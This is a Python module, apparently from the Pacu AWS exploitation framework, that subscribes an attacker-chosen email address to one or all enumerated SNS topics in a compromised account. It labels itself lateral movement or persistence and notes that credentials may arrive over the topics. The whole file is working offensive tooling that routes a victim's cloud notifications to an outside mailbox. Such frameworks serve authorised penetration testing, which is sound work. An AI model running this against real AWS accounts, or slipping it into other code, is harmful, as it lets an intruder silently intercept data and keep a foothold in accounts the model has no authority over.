#!/usr/bin/env python3
import argparse
import re
from copy import deepcopy

from pacu.core.lib import strip_lines
from pacu import Main

module_info = {
    "name": "sns__subscribe",
    "author": "h00die & 6a6f656c of nDepth Security",
    "category": "LATERAL_MOVE",  # or maybe persistence? kind of depends what may come over the topic, like creds
    "one_liner": "Subscribe to a Simple Notification Service (SNS) topic",
    "description": strip_lines(
        """
        This module will attempt to subscribe to a topic (arn) via an email address.
        """
    ),
    "services": ["SNS"],
    "prerequisite_modules": ['sns__enum'],
    "arguments_to_autocomplete": [],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info["description"])

parser.add_argument(
    "--all",
    action='store_true',
    help=strip_lines(
        """
    Attempt to subscribe to all Topic(s).
    """
    ),
)

parser.add_argument(
    "--topics",
    required=False,
    default=False,
    help=strip_lines(
        """
    Specific Topic(s) ARN to subscribe to. Comma separated Typically in the format arn:aws:sns:<region>:<client_id>:<topic_name>.
    """
    ),
)
parser.add_argument(
    "--email",
    required=True,
    default=None,
    help=strip_lines(
        """
    Email address to subscribe to the topic
    """
    ),
)


def main(args, pacu_main: "Main"):
    session = pacu_main.get_active_session()

    # Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print

    key_info = pacu_main.key_info
    fetch_data = pacu_main.fetch_data
    # End don't modify

    # https://www.geeksforgeeks.org/check-if-email-address-valid-or-not-in-python/
    email_regex = r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b"

    if not (re.fullmatch(email_regex, args.email)):
        print("  Please use a valid email address for email parameter\n")
        return

    if args.topics:
        topics_list = ",".join([topic.strip() for topic in args.topics.split(",")])
    elif args.all:
        if fetch_data(['SNS'], 'sns__enum', '') is False:
            print('No topics enumerated...')
            return
        else:
            topics_list = []
            for region in session.SNS['sns']:
                for topic in session.SNS['sns'][region]:
                    if not topic.endswith(".fifo"):
                        topics_list.append(topic)
            topics_list = ",".join(topics_list)
    else:
        print('--topics <topics> or --all required')
        return
    
    if not topics_list:
        print("  No valid topics found")
        return
    for topic in topics_list.split(","):
        topic = topic.strip()
        if not topic.startswith("arn:aws:sns:"):
            print(
                "  Please use a valid topic, typical format is arn:aws:sns:<region>:<client_id>:<topic_name>. Invalid item: {}\n".format(topic)
            )
            return

        if topic.endswith(".fifo"):
            print(
                "  Please use a valid topic, fifo topics can't be subscribed to via email. Invalid item: {}\n".format(topic)
            )
            return

    for topic in topics_list.split(","):
        topic = topic.strip()
        region_from_arn = topic.split(":")[3]
        client = pacu_main.get_boto3_client("sns", region=region_from_arn)
    
        # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/sns/client/subscribe.html
        try:
            response = client.subscribe(
                TopicArn=topic,
                Protocol="email",
                Endpoint=args.email,
                ReturnSubscriptionArn=True,
            )
            print(
                "Subscribed successfully, check email for subscription confirmation. Confirmation ARN: {}".format(
                    response["SubscriptionArn"]
                )
            )

            new_data = {
                "Protocol": "email",
                "Endpoint": args.email,
                "SubscriptionArn": response["SubscriptionArn"],
            }

            sns_data = deepcopy(session.SNS)
            if "sns" not in sns_data:
                sns_data["sns"] = {}
            if not region_from_arn in sns_data["sns"]:
                sns_data["sns"][region_from_arn] = {}
            if not topic in sns_data["sns"][region_from_arn]:
                sns_data["sns"][region_from_arn][topic] = {}
            if not "Subscribers" in sns_data["sns"][region_from_arn][topic]:
                sns_data["sns"][region_from_arn][topic]["Subscribers"] = [new_data]
            else:
                sns_data["sns"][region_from_arn][topic]["Subscribers"].append(new_data)
            session.update(pacu_main.database, SNS=sns_data)
        except Exception as error:
            print(
                "Unable to subscribe, check permissions and topic. Error: {}".format(error)
            )
